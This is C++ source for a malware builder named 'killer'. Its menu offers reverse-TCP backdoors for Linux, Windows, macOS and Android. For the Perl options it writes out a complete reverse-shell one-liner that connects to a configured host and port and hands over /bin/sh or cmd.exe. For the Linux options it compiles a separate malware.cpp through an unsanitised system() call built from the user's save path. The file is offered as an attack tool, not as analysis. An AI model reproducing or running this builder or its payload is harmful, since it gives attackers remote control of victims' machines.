#include <iostream>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <cstring>
#include "config.h"
using namespace std; 

int main(){

// variables 
string dpath;
string compile_cmd; 
string cpath;
string c ;
string SOON = " [-] This payload may not available actually, coming soon to fix this shit, Please be patient!";
int l = 0;

ofstream Scripter;
ifstream file_exist;


cout << endl << "  Select From The Menu Below:\n" << endl; 
cout << "       [Payload Title]:                     [Extension]:          [Description]:                                         [Sort]:"<< endl;
cout << "   Linux:\n   ======" << endl;
cout << "   (1) Build Linux Malware                  [.elf]                Linux Payload Reverse TCP , Run File                   Free" << endl;
cout << "   (2) Build Linux Kernel Malware           []                    Linux Kernel Payload Reverse TCP , Shell File          Free" << endl; 
cout << "   (3) Build Linux Kernel Malware           [.pl]                 Linux Kernel Payload Reverse TCP , Perl Source         Pro" << endl;
cout << "   (4) Build Android Malware                [.apk]                Android Payload Reverse TCP , Application File         Pro" << endl;
cout << "\n   Windows:\n   ========" << endl;
cout << "   (5) Build Windows Malware                [.exe]                Windows Payload Reverse TCP , Executable File          Pro" << endl;
cout << "   (6) Build Windows Malware                [.pl]                 Windows Payload Reverse TCP , Perl Source              Pro" << endl;
cout << "\n   MacOS/OSX:\n   ==========" << endl; 
cout << "   (7) Build Mac OS Malware                 [.dmg]                Mac OS Payload Reverse TCP , Mac Run File              Pro" << endl; 
cout << "   (8) Build Mac OS Malware                 [.pl]                 Mac OS Payload Reverse TCP , Perl Source               Pro \n" << endl; 
cout << "\n  killer[Malwares]>"; 
getline(cin,c); 

cout << endl;


// C/C++ Backdoors
if(c =="1"){
compile_cmd = "g++ -static -O3 -lpthread -pthread src/malware.cpp -o " ;
}
else if(c == "2"){
compile_cmd = "g++ src/malware.cpp -o ";
}

else if (c == "4"){
cout << SOON << endl;
exit(0);
} 
else if (c == "5"){
cout << SOON << endl;
exit(0);
}
else if (c == "7"){
cout << SOON << endl;
exit(0);
}

// Perl Backdoors 
else if (c == "3" || c == "6" || c == "8") {

cout << " +> Save Payload [to]:" ; 
getline(cin,dpath);

Scripter.open(dpath);

// Scripter begin
if (Scripter){
cout << " [*] Saving Backdoor to : " << dpath << " ..." << endl;



// Linux = 3 / MacOS = 8 
if (c == "3" || c == "8"){ 
Scripter << "#!/bin/perl" << endl; 
Scripter << "use Socket;$i=\""<< host_address <<"\";$p="<< PORT << ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}; " << endl;
}

// Windows = 6
if (c == "6"){
Scripter << "#!/bin/perl" << endl; 
Scripter << "use Socket;$i=\""<< host_address <<"\";$p="<< PORT << ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"C:\\\\Windows\\\\System32\\\\cmd.exe\");}; " << endl;
}
cout << " [+] Paylaod Generated to > " << dpath << endl;

}
else {
cout << " [-] File is Already Exists !" << endl;

}
return 4;
}
//Scripter end -- backdooring else start

else {
cout << " [-] Unknown: " << c << " Choice !  " << endl;
return 3;
} 


cout << " +> Save Payload [to]:" ; 
getline(cin,dpath);
cout << endl;
// file existing ... 
file_exist.open(dpath); 

if (!file_exist){

l = 1;

}

//when file exists already 
else {
cout << " +> File exist ,do you want to replace it[y/N]:";
string anw;
getline(cin,anw);
if (anw == "y" || anw == "Y" ) {

l = 1;

} 
else if (anw == "n" || anw == "N") {
cout << " [!] Killer Says: Thanks Much" << endl;
return 2;  
}
else{
cerr << " [-] " << anw <<": is Unknown Answer ! " << endl;
return 2;  
}// end if statment (answer to replace)

} // end file testing condition 



// payloading 
do {
cout << " [*] Building Payload > " << dpath << " ..." << endl; 
cpath = compile_cmd + dpath ; 


// convert string to char to commands doing
char *cmd_path = new char[cpath.length() + 1]; // or char y[100];
std::strcpy(cmd_path, cpath.c_str());

// doing // msgs
system(cmd_path);
cout << " [+] Paylaod Generated to > " << dpath << endl;

// delete outputs value
delete[] cmd_path;

l *= 0;

return 1;

}
while(l != 0);
 


return 0;
}
